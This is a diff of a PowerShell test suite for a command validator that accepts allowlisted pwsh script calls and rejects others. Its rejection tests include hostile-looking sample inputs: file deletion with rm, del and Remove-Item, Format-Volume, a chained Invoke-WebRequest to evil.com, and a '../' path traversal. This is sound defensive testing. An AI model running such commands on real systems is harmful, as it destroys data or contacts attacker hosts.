@@ -184,9 +184,10 @@ Assert-Accepted `
     -Command "pwsh -NoProfile -File scripts/ppl-from-sd/Build_Ppl_From_SourceDistribution.ps1 -RepositoryPath ." `
     -TestName "Valid PPL build command"
 
-Assert-Accepted `
+Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/build-source-distribution/Build_Source_Distribution.ps1" `
-    -TestName "Valid command with minimal arguments"
+    -TestName "Script without parameters is rejected" `
+    -ExpectedReason "must be called with parameters"
 
 Assert-Accepted `
     -Command "pwsh -NoProfile -File scripts/sub-dir/nested-script.ps1 -Param Value" `
@@ -197,20 +198,20 @@ Write-Host ""
 # Test Group 2: Allowlist Enforcement
 Write-Host "Test Group 2: Allowlist Enforcement" -ForegroundColor Yellow
 
-$allowlist = @("pwsh -NoProfile -File scripts/allowed-script.ps1")
+$allowlist = @("pwsh -NoProfile -File scripts/allowed-script.ps1 -Param Value")
 
 Assert-Accepted `
-    -Command "pwsh -NoProfile -File scripts/allowed-script.ps1" `
+    -Command "pwsh -NoProfile -File scripts/allowed-script.ps1 -Param Value" `
     -TestName "Exact match in allowlist" `
     -AllowedRuns $allowlist
 
 Assert-Accepted `
-    -Command "PWSH -NoProfile -File scripts/allowed-script.ps1" `
+    -Command "PWSH -NoProfile -File scripts/allowed-script.ps1 -Param Value" `
     -TestName "Case-insensitive allowlist match" `
     -AllowedRuns $allowlist
 
 Assert-Rejected `
-    -Command "pwsh -NoProfile -File scripts/other-script.ps1" `
+    -Command "pwsh -NoProfile -File scripts/other-script.ps1 -Param Value" `
     -TestName "Not in allowlist" `
     -ExpectedReason "not in allowlist" `
     -AllowedRuns $allowlist
@@ -253,12 +254,12 @@ Write-Host "Test Group 4: Forbidden Tokens" -ForegroundColor Yellow
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1 -Command 'rm file.txt'" `
     -TestName "Contains 'rm ' token" `
-    -ExpectedReason "forbidden token 'rm '"
+    -ExpectedReason "forbidden pattern"
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1 -Command 'del file.txt'" `
     -TestName "Contains 'del ' token" `
-    -ExpectedReason "forbidden token 'del '"
+    -ExpectedReason "forbidden pattern"
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1; Remove-Item file.txt" `
@@ -268,7 +269,7 @@ Assert-Rejected `
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1 -Param 'Format-Volume'" `
     -TestName "Contains 'Format-' token" `
-    -ExpectedReason "forbidden token 'Format-'"
+    -ExpectedReason "forbidden pattern"
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1; Invoke-WebRequest http://evil.com" `
@@ -291,7 +292,7 @@ Assert-Rejected `
     -ExpectedReason "command injection"
 
 Assert-Rejected `
-    -Command "pwsh -NoProfile -File scripts/../other/test.ps1" `
+    -Command "pwsh -NoProfile -File scripts/../other/test.ps1 -Param value" `
     -TestName "Contains parent directory '../' (caught by path traversal detection)" `
     -ExpectedReason "path traversal"
 
@@ -303,7 +304,7 @@ Write-Host "Test Group 5: Edge Cases" -ForegroundColor Yellow
 Assert-Rejected `
     -Command "" `
     -TestName "Empty command" `
-    -ExpectedReason "must start with"
+    -ExpectedReason "empty or whitespace"
 
 Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/test.ps1; pwsh -NoProfile -File scripts/other.ps1" `
@@ -314,13 +315,23 @@ Assert-Accepted `
     -Command "pwsh -NoProfile -File scripts/test.ps1 -Param 'value with spaces' -Flag" `
     -TestName "Command with spaces in parameter values"
 
-Assert-Accepted `
+Assert-Rejected `
     -Command "pwsh -NoProfile -File scripts/my-script-name.ps1" `
-    -TestName "Command with hyphens in script name"
+    -TestName "Command with hyphens in script name (no params)" `
+    -ExpectedReason "must be called with parameters"
+
+Assert-Rejected `
+    -Command "pwsh -NoProfile -File scripts/MyScript123.ps1" `
+    -TestName "Command with mixed case and numbers (no params)" `
+    -ExpectedReason "must be called with parameters"
 
 Assert-Accepted `
-    -Command "pwsh -NoProfile -File scripts/MyScript123.ps1" `
-    -TestName "Command with mixed case and numbers"
+    -Command "pwsh -NoProfile -File scripts/my-script-name.ps1 -Param value" `
+    -TestName "Command with hyphens in script name (with params)"
+
+Assert-Accepted `
+    -Command "pwsh -NoProfile -File scripts/MyScript123.ps1 -Param value" `
+    -TestName "Command with mixed case and numbers (with params)"
 
 Write-Host ""
 
